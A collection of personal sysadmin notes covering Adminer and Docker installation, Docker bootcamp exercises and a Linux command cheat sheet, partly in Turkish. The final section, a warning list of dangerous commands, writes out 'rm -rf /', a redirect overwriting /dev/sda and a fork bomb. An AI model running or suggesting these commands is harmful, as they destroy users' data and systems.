Dosya Yolu : adminer/adminer-kurulum.txt					
					
					Adminer

Step 1: Update and Upgrade Ubuntu

	sudo apt update && sudo apt upgrade
	
Step 2: Install Apache on Ubuntu

	sudo apt install apache2
	sudo systemctl enable --now apache2
	
Step 3: Install PHP on Ubuntu

	sudo apt install php php-curl libapache2-mod-php php-cli php-mysql php-gd php-fpm
	systemctl reload apache2
	sudo systemctl status apache2 --no-pager -l
	
Step 4: Install MariaDB on Ubuntu

	sudo apt install mariadb-server
	sudo systemctl enable --now mariadb
	sudo systemctl status mariadb
	sudo mysql_secure_installation
	
Step 5: Set Admin Password for Adminer

	sudo mysql
	SET PASSWORD FOR 'root'@'localhost' = PASSWORD("my password");
	FLUSH PRIVILEGES;
	exit;
	
Step 6: Install Adminer on Ubuntu
	
	sudo apt install adminer
	sudo a2enconf php*-fpm
	sudo a2enconf adminer
	systemctl reload apache2
	sudo systemctl restart apache2
	sudo systemctl status apache2 --no-pager -l
	
Step 7: Access the Adminer Web Interface

	http://127.0.0.1/adminer
	
	
	
Dosya Yolu: docker/docker-bootcamp.txt


========= 
Bare-Metal (Windows 10) 
Virtual Machine ()
Container

-------------------------- 
Docker Nedir ?
LXC : LinuX Containers LXC () Linux Container üzerine kurulu bir container yapısıdır.
Docker 2008 Yılında Soloman Hykes 
2013 Docker Kuruldu 
2014 Docker 1.0
2015 Docker Swarm (Orchestration)
Go diliyle 
Open source
DotCloud =>  Docker INC

Docker CE Major 6, Destek sağlanıyor
Docker EE Major 12-18 ay, Destek sağlanıyor

Docker 
---------------
Hızlı Derleme 
Dağıtım 
Paket Sistemei
Ölçeklendirme (Orch...)
Test Etme

Docker Hub : Image Al/Ver

Docker Platform 
Windows, Linux, MAcOS

------------------------------
docker version 
docker -v
docker --version 

docker info

docker --help
docker image --help

docker -v
mvn -v 
java --version 
node -v

docker run hello-world
docker container run hello-world

------------------------------------------------------------
------------------------------------------------------------
------------------------------------------------------------
docker search nginx 
docker pull   nginx
docker pull   nginx:latest
docker pull   nginx:1.15


docker pull ubuntu
docker pull alpine
docker pull centos
docker pull mysql
docker pull httpd

------------------------------------
-- Container --
docker container run --publish   1111:80 nginx (publish: reverse proxy port)
docker container run --publish   2222:80 --detach nginx (detach: arka planda çalış lütfen)
docker container run -p   3333:80 -d nginx
docker container run -p 4444:80 -d --name techcareer nginx (name: container adını yazdırmak)

------------------------------------
-- Image --
docker image --help 
docker image ls
docker image prune (prune: kullanılmayan bütün image'leri sil)



------------------------------------
-- List--
docker container ls 
docker container ls -a
docker container ps 
docker ps 

------------------------------------
-- Start/Stop --
docker container stop containerID
docker container stop containerNAME
docker container stop 0023a98fc505
docker container start 0023a98fc505

------------------------------------
-- Delete --
docker container rm  0023a98fc505
docker container rm -f 266f629d9bc0 (f: stop yapmadan sil)
docker container rm -f 0023a98fc505 e5fd3be3f3d7
docker container prune (prune: Çalışmayan bütün containerleri sil)

------------------------------------
-- Monitoring --
docker ps
docker container logs container_ID
docker container logs container_NAME
docker container logs techcareer
docker container logs --details techcareer
docker container logs --tail 5 techcareer (son 5 log'u göster)
docker container logs -f  techcareer (f: follow)

------------------------------------
-- LOGS TIS --
t: top: çalışan processler 
i: inspect detaylı nbilgi 
s:stats: performan bilgi(kaynak tüketimi)

docker container ls 
docker container ps 
docker container top techcareer 
docker container inspect techcareer 
docker container stats techcareer 

------------------------------------
docker search ubuntu 
docker pull ubuntu

alpine => sh 
ubuntu => bash 
window => powershell 

-- Terminal --
## Yeni bir container oluştur ve ona bağlan
docker container run -it -p 1111:80 --name techcareer ubuntu bash
winpty docker container run -it -p 1111:80 --name techcareer ubuntu bash
i: interactive 
t: terminal

docker ps 
## Çalışan bir container üzerinden terminale bağlanacağım. 
docker container exec -it containerID bash


## Kapatılmış container üzerinden terminale bağlanacağım. 
docker container start -ai containerID

Examples
docker search nginx 
docker pull nginx 
docker image ls 

--rm: container stop yaptığınızda otomatik silinir.
docker container run  -p 7777:80 nginx
docker container run -d -p 7777:80 nginx
docker container run -d -p 7777:80 --name web2 nginx
docker container run -p 7777:80 --name web2 --rm nginx
docker container run -d -p 7777:80 --name web2 --rm nginx

docker container exec -it web2 bash
cat > usr/share/nginx/html/index.html 
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <p>Nasılsınız Lorem, ipsum.</p>
</body>
</html>


------------------------------------
-- Mount --
Verilerimizin container dışında güvenl, bir limanda tutmak istiyorsak,  persist data kullanmak zorundayız
1- Volume (Production)  ***(Contaniner dışında özel bir yerde saklansın)
2- Bind Mound (Test) :Host sistemi üzerinde container içinde saklanıyor.

Database (Veri tabanı)
Log 
xml 
json 

volume     : -v  
bind mound : -v 

------------------------------------
-- Bind Mound --
docker search nginx 
docker pull nginx 

index.html
----------
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <p>Nasılsınız Ben bir Bind Mound Datasıyım.</p>
</body>
</html> 


docker container run -d -p 6666:80 -v TaşınmasınıIstediğimDosyaYer:OrijinalDosyaYeri nginx
sudo docker container run  -d --rm -p 2222:80 --name bind_nginx -v /home/hamit/Desktop/websitem:/usr/share/nginx/html nginx

------------------------------------
-- Volume --
$ docker volume --help
$ docker volume create volumeName
$ docker volume ls 
$ docker volume inspect volumeName
$ docker volume prune 
$ docker volume rm 

Mountpoint : Volume fiziksel olarak bulunduğu yer demektir.
"Mountpoint": "/var/lib/docker/volumes/volumeName/_data",


$ mintty docker container run -it -v volumeName:/webpages ubuntu sh
$ mintty docker container run -it -v volumeName:/webpages alpine sh
$ docker volume ls
$ docker volume inspect volumeName

$ cd /webpages 
$ cat >> index.html
-----------------------
### index.html ###
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <p>Nasılsınız Ben Bir Volume Datasıyım.</p>
</body>
</html> 
$ exit 


------------------------------------
-- Volume --
Docker - Volume - Mysql

docker ps 
docker ps -a
docker container rm -f dockerID

docker search mysql
docker pull mysql/mysql-server:latest 
docker ps 
docker ps -a
docker image ls 
netstat -nlptu

docker volume ls 
docker volume rm volumeName1 volumeName2 volumeName3
docker volume --help
docker create -v /var/lib/mysql --name mysqldatabase mysql/mysql-server:latest
docker volume ls
docker ps  -a 
Mysql Container ID:8f30d2f90670  
Mysql Container NAME: mysqldatabase

docker ps -a 
docker container run -p 3306:3306 -d -e MYSQL_ROOT_PASSWORD=root --volumes-from mysqldatabase --name=mysqldb mysql/mysql-server:latest
winpty docker container exec -it mysqldb bash
mysql -uroot -p
root
SHOW DATABASES;

CREATE SCHEMA `spa` DEFAULT CHARACTER SET utf8 ;
use volume;
CREATE TABLE `spa`.`blog` (
  `id` INT NOT NULL AUTO_INCREMENT,
  `title` VARCHAR(250) NULL,
  `content` VARCHAR(250) NULL,
  `created_date` TIMESTAMP NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`));

  INSERT INTO `spa`.`blog` (`title`, `content`) VALUES ('title-1', 'content-1');
  INSERT INTO `spa`.`blog` (`title`, `content`) VALUES ('title-2', 'content-2');
  SELECT * FROM spa.blog;
  SHOW DATABASES;

exit (Mysql)
exit (Bash terminal)

docker container rm -f mysqldb
docker container run -p 3306:3306 -d -e MYSQL_ROOT_PASSWORD=root --volumes-from mysqldatabase --name=mysqldatabasenew mysql/mysql-server:latest
winpty docker container exec -it mysqldatabasenew bash
mysql -uroot -p
root
SHOW DATABASES;

------------------------------------
-- Image Oluşturmak --
docker login

docker image --help
docker image ls 
docker image tag --help 

DockerHub Repository Name: javahamitmizrak/spring_react_blog
imageName: Oluşturduğumuz DockerFile veya docker-compose.yml'da veya daha önceden pull yaptığımız image adları.

docker image tag imageName javahamitmizrak/spring_react_blog
docker image tag my_spring_react:latest javahamitmizrak/spring_react_blog

docker push javahamitmizrak/spring_react_blog
docker image ls 
docker image rm imageName
docker pull javahamitmizrak/spring_react_blog
docker logout

------------------------------------
-- Docker Swarm (orchestraction) --
K8S - Docker Swarm (Birden fazla  container yönetiminde)

Docker Swarm (Docker Engine içerisinde )
docker info 
Eğer Swarm inacative görünmüyorsa =>   
docker swarm leave --force
docker swarm init

Manager - Worker 
docker swarm --help

docker swarm init (active et)
docker swarm leave (Swarm Kapat)
docker swarm update (Swarm Güncellemek)

docker swarm node ls 

------------------------------------
-- Service --
docker service --help  (service: çalışan container kapandığında otomatik olarak açsın ve o container sürekli çalışsın)
docker service ls 
docker service ps ID 
docker service rm ID 
docker container rm -f containerID

Manager Node Raft Consensus Algoritması
N-1/2



------------------------------------
-- Swarm  --
Orchestration
https://labs.play-with-docker.com/

docker info
docker swarm init (active et)
docker swarm leave (Swarm Kapat)
docker swarm update (Swarm Güncellemek)
docker swarm node ls 

Ctrl+ Insert tuşu (Copy)
Shift+ Insert tuşu (Pase)

1.ADIM 
-------------
5 tane instance oluştur. 
ifconfig ile ip adresini gördüm

Herhangi bir node       => Aktif Manager Seç => ( docker swarm init --advertise-addr 192.168.0.13 )
Aktif Manager node iken => Pasif Manager Seç => ( docker swarm join-token manager ) docker swarm join --token SWMTKN-1-4pihi7pb25k8szb0q9wggj96iz48wfoxxbkw03h21gg5dho56r-exe7al8bhf4ep977xbqjtqd13 192.168.0.13:2377
Aktif Manager node iken => Workerlar Seç     => ( docker swarm join-token worker )  docker swarm join --token SWMTKN-1-4pihi7pb25k8szb0q9wggj96iz48wfoxxbkw03h21gg5dho56r-doff0ak6q3zgqsan2apjhp78k 192.168.0.13:2377


2.ADIM 
-------------
Pasif Manager için ID: 192.168.12 IP git => docker swarm join --token SWMTKN-1-4pihi7pb25k8szb0q9wggj96iz48wfoxxbkw03h21gg5dho56r-exe7al8bhf4ep977xbqjtqd13 192.168.0.13:2377
Pasif Manager için ID: 192.168.11 IP git => docker swarm join --token SWMTKN-1-4pihi7pb25k8szb0q9wggj96iz48wfoxxbkw03h21gg5dho56r-exe7al8bhf4ep977xbqjtqd13 192.168.0.13:2377

Worker  için ID: 192.168.10 IP git => docker swarm join --token SWMTKN-1-4pihi7pb25k8szb0q9wggj96iz48wfoxxbkw03h21gg5dho56r-doff0ak6q3zgqsan2apjhp78k 192.168.0.13:2377
Worker  için ID: 192.168.9 IP git => docker swarm join --token SWMTKN-1-4pihi7pb25k8szb0q9wggj96iz48wfoxxbkw03h21gg5dho56r-doff0ak6q3zgqsan2apjhp78k 192.168.0.13:2377


3.ADIM 
-------------
docker node ls (Aktif veya Pasif managerde bu komutu sadece çalıştırabilirsin)
docker service create --name web_server -p 7777:80 --replicas=9 nginx (aktif veya pasif managerde seçmelisiniz)

docker service ls 
docker service ps web_server


docker ps 
docker container rm -f containerID
docker node ls
docker service ps web_server

------------------------------------
-- Network --


------------------------------------
------------------------------------
------------------------------------
SonarQube
Grafana / Prometheus















Dosya Yolu: docker/docker-kurulum.txt
					
					Docker

→ Install Docker Engine on Ubuntu
     I. Install using the apt repository
     
        1. Set up Docker's apt repository.
	# Add Docker's official GPG key:
	sudo apt-get update
	sudo apt-get install ca-certificates curl
	sudo install -m 0755 -d /etc/apt/keyrings
	sudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc
	sudo chmod a+r /etc/apt/keyrings/docker.asc

	# Add the repository to Apt sources:
	echo \
	  "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu \
	  $(. /etc/os-release && echo "$VERSION_CODENAME") stable" | \
	  sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
	sudo apt-get update

	2. Install the Docker packages.
	sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
	
	3. Verify that the Docker Engine installation is successful by running the hello-world image.
	sudo docker run hello-world
	

     II. Install from a package
     
	If you can't use Docker's apt repository to install Docker Engine, you can download the deb file for your release and install it
	manually. You need to download a new file each time you want to upgrade Docker Engine.

	1. Go to https://download.docker.com/linux/ubuntu/dists/.

	2. Select your Ubuntu version in the list.

	3. Go to pool/stable/ and select the applicable architecture (amd64, armhf, arm64, or s390x).

	4. Download the following deb files for the Docker Engine, CLI, containerd, and Docker Compose packages:
		• containerd.io_<version>_<arch>.deb
		• docker-ce_<version>_<arch>.deb
		• docker-ce-cli_<version>_<arch>.deb
		• docker-buildx-plugin_<version>_<arch>.deb
		• docker-compose-plugin_<version>_<arch>.deb
		
	5. Install the .deb packages. Update the paths in the following example to where you downloaded the Docker packages.

		 sudo dpkg -i ./containerd.io_<version>_<arch>.deb \
		  ./docker-ce_<version>_<arch>.deb \
		  ./docker-ce-cli_<version>_<arch>.deb \
		  ./docker-buildx-plugin_<version>_<arch>.deb \
		  ./docker-compose-plugin_<version>_<arch>.deb
		  
		The Docker daemon starts automatically.

	6. Verify that the Docker Engine installation is successful by running the hello-world image.

		 sudo service docker start
		 sudo docker run hello-world
		 
		This command downloads a test image and runs it in a container. When the container runs, it prints a confirmation message
		and exits.
		
		
		
		
→ Install Docker Desktop

Recommended approach to install Docker Desktop on Ubuntu:

1. Set up Docker's package repository. See step one of Install using the apt repository.

2. Download latest DEB package. --> https://desktop.docker.com/linux/main/amd64/139021/docker-desktop-4.28.0-amd64.deb?utm_source=docker&utm_medium=webreferral&utm_campaign=docs-driven-download-linux-amd64&_gl=1*s7tjx0*_ga*MTAyMDY3MTU3MS4xNzA5MDY1MTQ2*_ga_XJWPQMJYHQ*MTcwOTA2NTE0NS4xLjEuMTcwOTA2Njg4MC42MC4wLjA.

3. Install the package with apt as follows:

	 sudo apt-get update
	 sudo apt-get install ./docker-desktop-<version>-<arch>.deb


→ Launch Docker Desktop

• systemctl --user start docker-desktop

• docker compose version
  Docker Compose version v2.17.3

• docker --version
  Docker version 23.0.5, build bc4487a

• docker version
  Client: Docker Engine - Community
  Cloud integration: v1.0.31
  Version:           23.0.5
  API version:       1.42
  <...>
  
• systemctl --user enable docker-desktop

• systemctl --user stop docker-desktop



-------------------------Docker Desktop sign in -------------------------
Error: Unable to log in. You must initialize pass before logging in to Docker Desktop

busra@bellis:~$ gpg --full-generate-key
gpg (GnuPG) 2.2.27; Copyright (C) 2021 Free Software Foundation, Inc.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Lütfen istediğiniz anahtarı seçiniz:
   (1) RSA ve RSA (varsayılan)
   (2) DSA ve Elgamal
   (3) DSA (yalnız imzalamak için)
   (4) RSA (sadece imzalamak için)
  (14) Existing key from card
Seçiminiz? 1
RSA anahtarları 1024 bit ile 4096 bit arasında olmalı.
İstediğiniz anahtar uzunluğu nedir? (3072) 3072
İstenen anahtar uzunluğu: 3072 bit
Lütfen anahtarın ne kadar süreyle geçerli olacağını belirtin.
         0 = anahtar süresiz geçerli
      <n>  = anahtar n gün geçerli
      <n>w = anahtar n hafta geçerli
      <n>m = anahtar n ay geçerli
      <n>y = anahtar n yıl geçerli
Anahtar ne kadar geçerli olacak? (0) 0
Anahtar hep geçerli olacak
Bu doğru mu? (e/H ya da y/N) y

GnuPG anahtarınızı betimlemek için bir kullanıcı kimliği oluşturmaya ihtiyaç duyuyor.

Adınız ve Soyadınız: busra
E-posta adresiniz: busra@gmail.com
Önbilgi: 
Seçtiğiniz KULLANICI-KİMLİĞİ:
    "busra <busra@gmail.com>"

(A)dı ve Soyadı, (Y)orum, (E)posta alanlarını değiştir ya da (T)amam/Çı(k)? T
Bir miktar rasgele bayt üretilmesi gerekiyor. İlk üretim sırasında biraz
hareket (klavyeyi kullanmak, fareyi hareket ettirmek, disklerden yararlanmak)
iyi olacaktır; bu yeterli rasgele bayt kazanmak için rasgele sayı
üretecine yardımcı olur.
Bir miktar rasgele bayt üretilmesi gerekiyor. İlk üretim sırasında biraz
hareket (klavyeyi kullanmak, fareyi hareket ettirmek, disklerden yararlanmak)
iyi olacaktır; bu yeterli rasgele bayt kazanmak için rasgele sayı
üretecine yardımcı olur.
gpg: anahtar xxxxxxxxxxxxxxxx son derece güvenli olarak imlendi.
gpg: directory '/home/busra/.gnupg/openpgp-revocs.d' created
gpg: revocation certificate stored as '/home/busra/.gnupg/openpgp-revocs.d/888XXXXXXXX88XXXXXXXX88888XXXXXXXXXXXXXX.rev'
genel ve gizli anahtar üretildi ve imzalandı.

pub   rsa3072 2024-02-26 [SC]
      888XXXXXXXX88XXXXXXXX88888XXXXXXXXXXXXXX
uid                      busraselimoglu <busra.selimogluu@gmail.com>
sub   rsa3072 2024-02-26 [E]


busra@bellis:~$ export GPGKEY=<xxxxxxxxxxxxxxxx>
busra@bellis:~$ pass init 888XXXXXXXX88XXXXXXXX88888XXXXXXXXXXXXXX

Daha sonra Docker Desktop uygulamasını yeniden başlatı ve sign in butonuna tıklayın
Dosya Yolu: linux/linux-commands.txt


-----------------------------Services------------------------------

→ Başlatılamayan sistem hizmetlerini bulmak için;
	systemctl --failed
	
→ Systemd-modules-load hizmetiyle ilgili bir sorun bulundu. Daha fazlasını bilmek için;
	systemctl status systemd-modules-load  
	
→ Başarısız mesajı yeniden oluşturmak gerekirse hizmeti yeniden başlatın;
	systemctl restart systemd-modules-load

→ Çalışan tüm servisleri görüntüleme	
	systemctl list-units --type service --state running
--------------------------------------------------------------------------
Dosya Adı : linux/linuxcommandslistEng.txt


-------------------------------------------------------------------------
										Hardware Information Commands

lscpu															→ See CPU information.
lsblk															→ See information about block devices.
lspci -tv													→ Show PCI devices (graphics card, network card, etc.) in a tree-like diagram.
lsusb -tv													→ Display USB devices in a tree-like diagram.
lshw															→ List hardware configuration information.
cat /proc/cpuinfo									→ Show detailed CPU information.
cat /proc/meminfo									→ View detailed system memory information.
cat /proc/mounts									→ See mounted file systems.
free -h														→ Display free and used memory.
sudo dmidecode										→ Show hardware information from the BIOS.
hdparm -i /dev/[device_name]			→ Display disk data information.
hdparm -tT /dev/[device_name]			→ Conduct a read speed test on the device/disk.
badblocks -s /dev/[device_name]		→	Test for unreadable blocks on the device/disk.
fsck /dev/[device_name]						→ Run a disk check on an unmounted disk or partition.

-------------------------------------------------------------------------
													Searching Commands

find [path] -name [search_pattern]							→ Find files and directories that match the specified pattern in a specified location.
find [path] -size [+100M]												→ See files and directories larger than a specified size in a directory.
grep [search_pattern] [file_name]								→ Search for a specific pattern in a file with grep.
grep -r [search_pattern] [directory_name]				→ Recursively search for a pattern in a directory.
locate [name]																		→ Locate all files and directories related to a particular name.
which [command]																	→ Search the command path in the $PATH environment variable.
whereis [command]																→ Use the whereis command to find the source, binary, and manual page for a command.
awk '[search_pattern] {print $0}' [file_name]		→ Print all lines matching a pattern in a file. 
sed 's/[old_text]/[new_text]/' [file_name]			→ Find and replace text in a specified file.


-------------------------------------------------------------------------
													File Commands

mkdir [directory_name]																→ Create a new directory.
rm [file_name]																				→ Remove a file.
rm -r [directory_name]																→ Remove a directory recursively.
rm -rf [directory_name]																→ Recursively remove a directory without requiring confirmation.
cp [source_file] [destination_file]										→ Copy the contents of one file to another file using the cp command.
cp -r [source_directory] [destination_directory]			→ Recursively copy a directory to a second directory.
mv [source_file] [destination_file]										→ Move or rename files or directories.
ln -s [path]/[file_name] [link_name]									→ Create a symbolic link to a file.
touch [file_name]																			→ Create a new file using touch.
cat [file_name]																				→ Show the contents of a file.
cat [source_file] >> [destination_file]								→ Append file contents to another file.
head [file_name]																			→ Show the first ten lines of a file.
tail [file_name]																			→ Show the last ten lines of a file with the tail command.
more [file_name]																			→ Display contents of a file page by page.
less [file_name]																			→ Show the contents of a file with navigation using the less command.
nano [file_name]																			→ Open or create a file using the nano text editor.
vi [file_name]																				→ Open or create a file using the Vi/Vim text editor.
vim [file_name]																				→ Open or create a file using the Vi/Vim text editor.
gpg -c [file_name]																		→ Encrypt a file.
gpg [file_name].gpg																		→ Decrypt an encrypted .gpg file.
wc -w [file_name]																			→ Show the number of words, lines, and bytes in a file using wc.
ls | xargs wc																					→ List the number of lines/words/characters in each file in a directory with the xargs command.
cut -d [delimiter] [file_name]												→ Cut a section of a file and print the result to standard output.
[data] | cut -d [delimiter]														→ Cut a section of piped data and print the result to standard output.
shred -u [file_name]																	→ Overwrite a file to prevent its recovery, then delete it.
diff [first_file] [second_file]												→ Compare two files and display differences.
source [file_name]																		→ Read and execute the file content in the current shell.
[command] | tee [file_name] >/dev/null								→ Store the command output in a file and skip the terminal output.


-------------------------------------------------------------------------
									Directory Navigation Commands

ls												→ List files and directories in the current directory.
ls -a											→ List all files and directories in the current directory (shows hidden files).
ls -l											→ List files and directories in long format.
pwd												→ Show the directory you are currently working in.
cd												→ Change directory to $HOME.
cd ~											→ Change directory to $HOME.
cd ..											→ Move up one directory level.
cd -											→ Change to the previous directory.
cd [directory_path]				→ Change location to a specified directory.
dirs											→ Show current directory stack.

-------------------------------------------------------------------------
											File Compression Commands

tar -cf [archive.tar] [file/directory]				→ Archive an existing file or directory.
tar -xf [archive.tar]													→ Extract an archived file.
tar -czf [archive.tar.gz]											→ Create a .gz compressed tar archive.
gzip [file_name]															→ Compress or decompress .gz files.
gunzip [file_name.gz]													→ Compress or decompress .gz files.
bzip2 [file_name]															→ Compress or decompress .bz2 files.
bunzip2 [file_name.bz2]												→ Compress or decompress .bz2 files.

-------------------------------------------------------------------------
												File Transfer Commands

wget [link]																										→ Download files from FTP or web servers via the wget command.
curl -O [link]																								→ Transfer data to or from a server with various protocols using the curl command.
ftp [remote_host]																							→ Transfer files between local and remote systems interactively using FTP.
sftp [user]@[remote_host]																			→ Securely transfer between local and remote hosts using SFTP.
scp [source_file] [user]@[remote_host]:[destination_path]			→ Copy a file to a server directory securely using the Linux scp command.
rsync -a [source_directory] [user]@[remote_host]:[destination_directory]	→ Synchronize the contents of a directory with a backup directory using the rsync command.

-------------------------------------------------------------------------
												User and Group Commands

id																									→ See details about the active users.
last																								→ Show the last system logins.
who																									→ Display who is currently logged into the system with the who command.
w																										→ Show which users are logged in and their activity with the w command.
finger [user_name]																	→ Show user information.
sudo useradd [user_name]														→ Create a new user account.
sudo adduser [user_name]														→ Create a new user account through the adduser command interface.
sudo userdel [user_name]														→ Delete a user account.
sudo usermod -aG [group_name] [user_name]						→ Modify user information (add a user to a group).
passwd																							→ Change the current user's password or another user's password with the passwd command.
sudo passwd [user_name]															→ Change the current user's password or another user's password with the passwd command.
sudo groupadd [group_name]													→ Add a new group.
sudo groupdel [group_name]													→ Delete a group.
sudo groupmod -n [new_name] [old_name]							→ Modify a user group (change group name).
sudo [command]																			→ Temporarily elevate user privileges to superuser or root using the sudo command.
su - [user_name]																		→ Switch the user account or become a superuser.
chgrp [group_name] [file/directory]									→ Change file or directory group.

-------------------------------------------------------------------------
											Package Installation Commands
											
1. Debian and Ubuntu-Based Distributions

sudo apt-get install [package_name]			→ Install an APT package using the apt-get package utility.
sudo apt install [package_name]					→ Install an APT package using a newer APT package manager.
apt search [keyword]										→ Search for a package in the APT repositories.
apt list																→ List packages installed with APT.
apt show [package_name]									→ Show information about a package.
sudo dpkg -i [package_name.deb]					→ Install a .deb package with the Debian package manager (dpkg command).
sudo dpkg -l														→ List packages installed with dpkg.

2. Red Hat-Based Distributions (CentOS, Fedora)

sudo yum install [package_name]					→ Install a package using the YUM package manager.
yum search [keyword]										→ Find a package in the YUM repositories based on the provided keyword.
yum list installed											→ List all packages installed with YUM.
yum info [package_name]									→ Show package information for a package.
sudo dnf install [package_name]					→ Install a package using the DNF package manager.
sudo rpm -i [package_name.rpm]					→ Install a .rpm package from a local file.

3. Universal Linux Packages

sudo snap install [package_name]			→ Install a Snap package.
sudo snap find [keyword]							→ Search for a package in the Snap store.
sudo snap list												→ List installed Snap packages.
flatpak install [package_name]				→ Install a Flatpak package.
flatpak search [keyword]							→ Search for a Flatpak application in repositories.
flatpak list													→ List installed Flatpack packages.

tar -zxvf [file_name.tar.gz]
cd [extracted_directory]							Install software from source code.
./configure make
make install	

-------------------------------------------------------------------------
											Process Related Commands

ps																→ List active processes.
pstree														→ Show processes in a tree-like diagram.
pmap															→ Display a memory usage map of processes.
top																→ See all running processes.
htop															→ Interactive and colorful process viewer.
kill [process_id]									→ Terminate a Linux process under a given ID.
pkill [process_name]							→ Terminate a process under a specific name.
killall [label]										→ Terminate all processes with a given label.
prgrep [keyword]									→ List processes based on the provided keyword.
pidof [process_name]							→ Show the PID of a process.
bg																→ List and resume stopped jobs in the background.
fg																→ Bring the most recently suspended job to the foreground.
fg [job]													→ Bring a particular job to the foreground.
lsof															→ List files opened by running processes with lsof command.
trap "[commands]" [signal]				→ Catch a system error signal in a shell script. Executes provided commands when the signal is caught.
wait															→ Pause the terminal or a Bash script until a running process is completed.
nohup [command] &									→ Run a Linux process in the background.

-------------------------------------------------------------------------
								System Management and Information Commands

uname -r 													→ Show system information via uname command.
uname -a 													→ See kernel release information.
uptime 														→ Display system uptime, including the load average.
hostname													→ View system hostname.
hostname -i 											→ Show the IP address of the system.
last reboot 											→ List system reboot history.
date															→ See current time and date.
timedatectl 											→ Query and change the system clock.
cal																→ Show current calendar (month and day).
w																	→ List logged-in users.
whoami														→ See which user you are using.
finger [user_name]								→ Show information about a particular user.
ulimit [flags] [limit]						→ View or limit system resource amounts.
shutdown [hh:mm]									→ Schedule a system shutdown.
shutdown now											→ Shut down the system immediately.
modprobe [module_name]						→ Add a new kernel module.
dmesg															→ Show bootup messages.

-------------------------------------------------------------------------
														Disk Usage Commands

df -h																			→ Check free and used space on mounted systems.
df -i																			→ Show free inodes on mounted file systems.
fdisk -l																	→ Display disk partitions, sizes, and types with the command.
du -ah																		→ See disk usage for all files and directories.
du -sh																		→ Show disk usage of the current directory.
mount																			→ Show currently mounted file systems.
findmnt																		→ Display target mount point for all file systems.
mount [device_path] [mount_point]					→ Mount a device.

-------------------------------------------------------------------------
												SSH Login Commands

ssh [user_name]@[remote_host]																	→ Connect to a remote host as a user via SSH.
ssh [host]																										→ Securely connect to a host via SSH default port 22.
ssh -p [port] [user_name]@[remote_host]												→ Connect to the host using a particular port.
ssh-keygen																										→ Generate SSH key pairs.
sudo service sshd start																				→ Start SSH server daemon.
scp [file_name] [user_name]@[remote_host]:[remote_path]				→ Securely copy files between local and remote systems via SSH.
sftp [user_name]@[remote_host]																→ Interactive file transfer over encrypted SSH session using SFTP protocol.
telnet [host]																									→ Connect to the host via Telnet default port 23.

-------------------------------------------------------------------------
										File Permission Commands

chmod 777 [file_name]						→ Assign read, write, and execute file permission to everyone (rwxrwxrwx).
chmod 755 [file_name]						→ Give read, write, and execute permission to owner, and read and execute permission to group and others (rwxr-xr-x).
chmod 766 [file_name]						→ Assign full permission to the owner, and read and write permission to the group and others (rwxrw-rw-).
chown [user_name] [file_name]		→ Change the ownership of a file with chown command.
chown [user_name]:[group_name] [file_name]			→ Change the owner and group ownership of a file.

-------------------------------------------------------------------------
												Network Commands

ip addr show														→ List IP addresses and network interfaces.
ip address add [IP_address]							→ Assign an IP address to interface eth0.
ifconfig																→ Display IP addresses of all network interfaces.
ping [remote_host]											→ Ping remote host.
netstat -pnltu													→ See active (listening) ports with the netstat command.
netstat -tuln														→ Show TCP and UDP ports and their programs.
whois [domain_name]											→ Display more information about a domain.
dig [domain_name]												→ Show DNS information about a domain using the dig command.
dig -x [domain_name]										→ Do a reverse DNS lookup on the domain.
dig -x [IP_address]											→ Do a reverse DNS lookup of an IP address.
host [domain_name]											→ Perform an IP lookup for a domain.
hostname -I															→ Show the local IP address.
nslookup [domain_name]									→ Receive information about an internet domain.

-------------------------------------------------------------------------
											Variable Commands

let "[variable_name]=[value]"						→ Assign an integer value to a variable.
export [variable_name]									→ Export a Bash variable.
declare [variable-name]= "[value]"			→ Declare a Bash variable.
set																			→ List the names of all the shell variables and functions.
unset [variable_name]										→ Remove an environment variable.
echo $[variable-name]										→ Display the value of a variable.

-------------------------------------------------------------------------
											Shell Command Management

alias [alias-name]='[command]'									→ Create an alias for a command.
watch -n [interval-in-seconds] [command]				→ Set a custom interval to run a user-defined command.
sleep [time-interval] && [command]							→ Postpone the execution of a command.
at [hh:mm]																			→ Create a job to be executed at a certain time (Ctrl+D to exit prompt after you type in the command).
man [command]																		→ Display a built-in manual for a command.
history																					→ Print the command history used in the terminal.

-------------------------------------------------------------------------
									Linux Shell Keyboard Shortcuts

Ctrl + C			→ Kill process running in the terminal.
Ctrl + Z			→ Stop the current process. The process can be resumed in the foreground with fg or in the background with bg.
Ctrl + W			→ Cut one word before the cursor and add it to the clipboard.
Ctrl + U			→ Cut part of the line before the cursor and add it to the clipboard.
Ctrl + K			→ Cut part of the line after the cursor and add it to the clipboard.
Ctrl + Y			→ Paste from clipboard.
Ctrl + R			→ Recall the last command that matches the provided characters.
Ctrl + O			→ Run the previously recalled command.
Ctrl + G			→ Exit command history without running a command.
clear					→ Clear the terminal screen.
!!						→ Run the last command again.
exit					→ Log out of the current session.

-------------------------------------------------------------------------
									Dangerous Linux Terminal Commands
									
1. rm -rf /   Command

$ rm -rf /

The rm command in Linux allows you to delete files and directories. However, there is no undelete option, which makes the deleted files gone forever. That means that using the rm command to permanently remove sensitive system files would cause system instability. Running the rm command with the -r and -f flags forces a recursive deletion through all subdirectories. Running it on the / root directory would wipe the system entirely.

Note: Some Linux systems issue a warning before executing this command, like in the screenshot, while others won't.


2. Command  >/dev/sda

$ command >/dev/sda

Executing a command and appending it with >/dev/sda writes the command's output on the /dev/sda block, i.e., on your hard drive. The dev/sda block contains filesystem data, which is then replaced with the command output, damaging your system and making it irrecoverable. The command can be any Linux command. For example, executing the shred command destroys all the data on the drive.


3. :(){ :|:& };: Fork Bomb

$ :(){ :|:& };:

